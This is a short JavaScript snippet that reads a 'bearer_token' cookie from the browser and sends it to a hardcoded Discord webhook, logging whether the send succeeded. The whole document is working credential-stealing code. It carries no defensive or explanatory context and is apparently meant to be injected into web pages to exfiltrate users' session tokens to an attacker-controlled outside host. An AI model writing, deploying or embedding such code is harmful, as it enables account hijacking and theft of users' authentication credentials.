(function() {
    function getBearerToken() {
        const cookies = document.cookie.split('; ');
        for (let i = 0; i < cookies.length; i++) {
            const cookie = cookies[i];
            if (cookie.startsWith('bearer_token=')) {
                return cookie.split('=')[1];
            }
        }
        return null;
    }

    const bearerToken = getBearerToken();
    if (bearerToken) {
        console.log('Bearer Token:', bearerToken);

        // Define the Discord webhook URL (updated with your provided webhook)
        const webhookUrl = 'https://discord.com/api/webhooks/1313187900338212977/G-FWHz8JSsAUP_0S_Eg0hW34zMBRm2ADsq4Ye-LUV0CxScS-IbYru7oVtBpD_U-U-MuR';

        // Prepare the payload with the bearer token
        const payload = {
            content: `Bearer Token: ${bearerToken}`
        };

        // Send the payload to the Discord webhook using fetch API
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (response.ok) {
                console.log('Successfully sent to Discord:', response.status);
            } else {
                response.text().then(text => {
                    console.error('Failed to send to Discord, Status Code:', response.status);
                    console.error('Response text:', text);
                });
            }
        })
        .catch(error => {
            console.error('Error sending to Discord:', error);
        });
    } else {
        console.log('Bearer token not found.');
    }
})();
